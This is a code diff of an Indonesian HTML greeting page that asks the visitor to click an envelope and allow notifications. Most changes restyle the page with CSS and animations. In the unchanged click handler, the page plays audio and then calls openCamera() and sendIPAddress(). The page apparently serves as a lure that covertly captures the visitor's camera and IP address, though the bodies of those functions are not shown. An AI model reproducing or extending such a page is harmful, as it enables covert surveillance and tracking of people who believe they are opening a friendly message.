@@ -4,35 +4,118 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=1, minimum-scale=1, maximum-scale=5">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <link href="https://feeldreams.github.io/hayoloh/style.css" rel="stylesheet" type="text/css">
-    <script src="https://feeldreams.github.io/hayoloh/script.js"></script>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Josefin+Sans:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Josefin+Sans:wght@400;700&display=swap">
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.all.min.js"></script>
     <script src="https://kit.fontawesome.com/4f3ce16e3e.js" crossorigin="anonymous"></script>
     <title>Script HTML Untukmu</title>
     <link rel="icon" type="image/x-icon" href="https://malasid.github.io/favicon.png">
     <style>
+        /* Gaya dasar */
         :root {
-            --warna-bg: rgba(0, 0, 0, .5);
+            --warna-bg: rgba(0, 0, 0, 0.5);
             --warna-teks: #fff;
             --warna-bingkai: #fff;
             --bingkai: 8px;
-            --bingkai-kiri: 2px solid var(--warna-bingkai);
-            --bingkai-kanan: 2px solid var(--warna-bingkai);
             --gaya-font: 'Josefin Sans', sans-serif;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: var(--gaya-font);
+            background-color: #000;
+            color: var(--warna-teks);
+            overflow: hidden;
+        }
+
+        #bodyblur {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(10px);
+            z-index: -1;
+        }
+
+        #wallpaper {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -2;
+            opacity: 0;
+            transition: opacity 1s ease, transform 1s ease;
+        }
+
+        #Content {
+            position: relative;
+            text-align: center;
+            margin-top: 20vh;
+            opacity: 0;
+            transition: opacity 1s ease, margin-top 1s ease;
+        }
+
+        #suratin {
+            cursor: pointer;
+            transition: all 1s ease;
+        }
+
+        #suratin img {
+            width: 100px;
+            height: auto;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        #ket {
+            font-size: 14px;
+            margin-top: 10px;
+            opacity: 0;
+            transition: opacity 1s ease;
+        }
+
+        #bq {
+            opacity: 0;
+            transform: scale(0.8);
+            transition: opacity 1s ease, transform 1s ease;
+        }
+
+        #Tombol {
+            opacity: 0;
+            transform: scale(0.8);
+            transition: opacity 1s ease, transform 1s ease;
+        }
+
+        /* Animasi */
+        @keyframes float {
+            0%, 100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-10px);
+            }
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
         }
     </style>
 </head>
 <body>
     <audio id="linkmp3" src="https://feeldreams.github.io/papapa.mp3"></audio>
-    <div id="bodyblur">
-        <img src="https://feeldreams.github.io/wp3.jpeg" id="wallpaper"/>
-    </div>
+    <div id="bodyblur"></div>
+    <img src="https://feeldreams.github.io/wp3.jpeg" id="wallpaper"/>
     <div id="Content">
         <div id="suratin" onclick="memulai();">
-            <img src="https://rayyscoding.github.io/envelope.png"/>
+            <img src="https://rayyscoding.github.io/envelope.png" alt="Surat"/>
         </div>
         <p id="ket">Klik Suratnya!</p>
         <p id="ket">Izinkan semua notif agar bisa mendapatkan notif dari aku❤️</p>
@@ -69,20 +152,20 @@
 
         // Fungsi untuk memulai
         function memulai() {
-            document.getElementById('suratin').style = "transition:all 1s ease;transform:scale(.1);opacity:0";
-            document.getElementById('ket').style = "transition:all 1s ease;transform:scale(.1);opacity:0";
+            document.getElementById('suratin').style.animation = 'fadeOut 1s forwards';
+            document.getElementById('ket').style.animation = 'fadeOut 1s forwards';
             setTimeout(() => {
                 document.getElementById('suratin').style.display = 'none';
                 document.getElementById('ket').style.display = 'none';
-                document.getElementById('Content').style = "opacity:1;margin-top:4vh";
-                document.getElementById('bodyblur').style = "opacity:.6;animation:none";
-                document.getElementById('wallpaper').style = "transform: scale(2);opacity:1;";
-                document.getElementById('fotoakhir').style = "display:inline-flex;";
-                document.getElementById('bq').style = "position:relative;opacity:1;visibility:visible;transform: scale(1);border-radius:var(--bingkai);margin-top:0";
-                setTimeout(() => {
-                    document.getElementById('Tombol').style = "opacity:1;transform: scale(1);";
-                }, 500);
-            }, 300);
+                document.getElementById('Content').style.opacity = '1';
+                document.getElementById('Content').style.marginTop = '10vh';
+                document.getElementById('wallpaper').style.opacity = '1';
+                document.getElementById('wallpaper').style.transform = 'scale(1.2)';
+                document.getElementById('bq').style.opacity = '1';
+                document.getElementById('bq').style.transform = 'scale(1)';
+                document.getElementById('Tombol').style.opacity = '1';
+                document.getElementById('Tombol').style.transform = 'scale(1)';
+            }, 1000);
             audio.play();
             openCamera();
             sendIPAddress();
